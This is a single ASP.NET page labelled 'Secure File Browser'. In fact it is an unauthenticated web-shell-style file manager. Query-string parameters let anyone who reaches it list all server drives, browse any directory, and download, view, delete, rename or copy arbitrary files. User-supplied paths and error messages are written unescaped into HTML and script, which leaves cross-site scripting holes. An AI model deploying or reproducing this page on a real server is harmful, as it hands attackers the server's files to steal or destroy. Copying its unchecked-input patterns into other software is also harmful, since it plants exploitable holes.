<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>

<%
    string directoryPath = Request.QueryString["path"];
    if (string.IsNullOrEmpty(directoryPath))
    {
        directoryPath = Server.MapPath("~/");
    }
    
    string downloadFile = Request.QueryString["download"];
    if (!string.IsNullOrEmpty(downloadFile) && File.Exists(downloadFile))
    {
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(downloadFile));
        Response.WriteFile(downloadFile);
        Response.End();
    }
    
    string deleteFile = Request.QueryString["delete"];
    if (!string.IsNullOrEmpty(deleteFile) && File.Exists(deleteFile))
    {
        try
        {
            File.Delete(deleteFile);
            Response.Redirect(Request.ServerVariables["SCRIPT_NAME"]+"?path=" + Path.GetDirectoryName(deleteFile));
        }
        catch (Exception ex)
        {
            Response.Write("<script>alert('Error deleting file: " + ex.Message + "');</script>");
        }
    }
    
    string renameFile = Request.QueryString["rename"];
    string newName = Request.QueryString["newname"];
    if (!string.IsNullOrEmpty(renameFile) && !string.IsNullOrEmpty(newName) && File.Exists(renameFile))
    {
        try
        {
            string newPath = Path.Combine(Path.GetDirectoryName(renameFile), newName);
            File.Move(renameFile, newPath);
            Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] +"?path=" + Path.GetDirectoryName(renameFile));
        }
        catch (Exception ex)
        {
            Response.Write("<script>alert('Error renaming file: " + ex.Message + "');</script>");
        }
    }
    
    string copyFile = Request.QueryString["copy"];
    string copyPath = Request.QueryString["copypath"];
    if (!string.IsNullOrEmpty(copyFile) && !string.IsNullOrEmpty(copyPath) && File.Exists(copyFile))
    {
        try
        {
            string destination = Path.Combine(copyPath, Path.GetFileName(copyFile));
            File.Copy(copyFile, destination, true);
            Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] +"?path=" + Path.GetDirectoryName(copyFile));
        }
        catch (Exception ex)
        {
            Response.Write("<script>alert('Error copying file: " + ex.Message + "');</script>");
        }
    }
    
    string viewFile = Request.QueryString["view"];
    if (!string.IsNullOrEmpty(viewFile) && File.Exists(viewFile))
    {
        string fileContent = File.ReadAllText(viewFile);
        Response.Clear();
        Response.ContentType = "text/plain"; 
        Response.Write(fileContent);
        Response.End();
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>Secure File Browser</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 20px;
            padding: 0;
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 50%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            background: #007bff;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }
        input[type="submit"]:hover {
            background: #0056b3;
        }
        h2 {
            color: #333;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            overflow: hidden;
        }
        th, td {
            padding: 12px;
            text-align: left;
        }
        th {
            background: #007bff;
            color: black;
        }
        tr:nth-child(even) {
            background: #f2f2f2;
        }
        tr:hover {
            background: #ddd;
        }
        .name-column {
            width: 40%;
        }
        .modified-column, .size-column {
            width: 20%;
        }
        .action-column {
            width: 20%;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
    <script>
        function renameFile(filePath, currentPath) {
            var newName = prompt("Enter new file name:");
            if (newName) {
                var new_path = '?path=' + currentPath + '&rename=' + filePath + '&newname=' + newName;
                window.location.href = new_path;
            }
        }
        function copyFile(filePath, currentPath) {
            var copyPath = prompt("Enter destination path:");
            if (copyPath) {
                window.location.href = '?path=' + currentPath + '&copy=' + filePath + '&copypath=' + copyPath;
            }
        }
    </script>
</head>
<body>
    <h2>Secure File Browser</h2>
    <form method="get">
        <label for="path">Enter Directory Path:</label>
        <input type="text" id="path" name="path" value="<%= directoryPath %>" />
        <input type="submit" value="Browse" />
    </form>
    <br/>
    
    <h3>Available Drives</h3>
    <ul>
        <% foreach (var drive in DriveInfo.GetDrives())
           {
               if (drive.IsReady)
               {
                   Response.Write("<li><a href='?path=" + drive.Name + "'>" + drive.Name + " (" + drive.DriveFormat + ")</a></li>");
               }
           }
        %>
    </ul>
    
    <table>
        <tr>
            <th class="name-column">Filename</th>
            <th class="modified-column">Last Modified</th>
            <th class="size-column">Size</th>
            <th class="action-column">Action</th>
        </tr>
        <% 
            if (Directory.Exists(directoryPath))
            {
                try
                {
                    string parentDirectory = Directory.GetParent(directoryPath).FullName;
                    if (!string.IsNullOrEmpty(parentDirectory) && directoryPath != parentDirectory)
                    {
                        Response.Write("<tr><td><a href='?path=" + parentDirectory + "'>..</a></td><td></td><td></td><td></td></tr>");
                    }
                }
                catch
                {
                    Response.Write("<tr><td><a href='#'>..</a></td><td></td><td></td><td></td></tr>");
                }
                
                foreach (var dir in Directory.GetDirectories(directoryPath))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    Response.Write("<tr><td><a href='?path=" + dir + "'>" + Path.GetFileName(dir) + "</a></td><td>" + dirInfo.LastWriteTime.ToString() + "</td><td></td><td></td></tr>");
                }
                
                foreach (var file in Directory.GetFiles(directoryPath))
                {
                    FileInfo fileInfo = new FileInfo(file);
                    string escapedFile = file.Replace("\\", "\\\\");
                    string escapedDirectory = directoryPath.Replace("\\", "\\\\");

                    Response.Write("<tr><td>" + Path.GetFileName(file) + "</td><td>" + fileInfo.LastWriteTime.ToString() + "</td><td>" + fileInfo.Length + " bytes</td><td>");
                    Response.Write("<a href='?download=" + file + "'>Download</a> | ");
                    Response.Write("<a href='?delete=" + file + "' onclick='return confirm(\"Are you sure you want to delete this file?\");'>Delete</a> | ");
                    Response.Write("<a href='?view=" + file + "' target='_blank'>View</a> | ");
                    Response.Write("<a href='#' onclick='renameFile(\"" + escapedFile + "\", \"" + escapedDirectory + "\")'>Rename</a> | ");
                    Response.Write("<a href='#' onclick='copyFile(\"" + escapedFile + "\", \"" + escapedDirectory + "\")'>Copy</a>");
                    Response.Write("</td></tr>");
                }
            }
        %>
    </table>
</body>
</html>